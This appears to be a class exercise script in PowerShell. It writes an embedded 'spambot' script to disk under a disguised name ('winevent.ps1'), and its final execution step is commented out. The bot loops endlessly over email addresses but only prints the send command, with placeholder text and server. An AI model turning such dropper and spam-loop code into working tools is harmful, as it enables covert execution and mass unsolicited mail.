<#
    Storyline: Dropper for our spambot that will
    save to a directory and then execute it.
#>

$writeSbBot = @'
# Send an email using Powershell
$toSend = @('test1@example.com', 'test2@example.com', 'mytest@othersite.net')

# Message body
$msg = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

while ($true) {

    foreach ($email in $toSend) {
    
        # Send the email
        Write-Host "Send-MailMessage -From 'my.email@champlain.edu' -To $email -Subject 'Test'`
        -Body $msg -SmtpServer X.X.X.X"
        
        # Pause for 1 second
        Start-Sleep 1

    }
}
'@

# Directory in which to write the bot (destination)
$sbDir = "C:\Users\Hasan Hashim\OneDrive\Desktop\champlain\SYS-320\Week11\class\"

# Create a random number to append to the file
$sbRand = Get-Random -Minimum 1000 -Maximum 1999

# Create the file and location to save the bot
$file = $sbDir + $sbRand + "winevent.ps1"

# Write to a file
$writeSbBot | Out-File -FilePath $file

# Executes the dropped script
#Invoke-Expression $file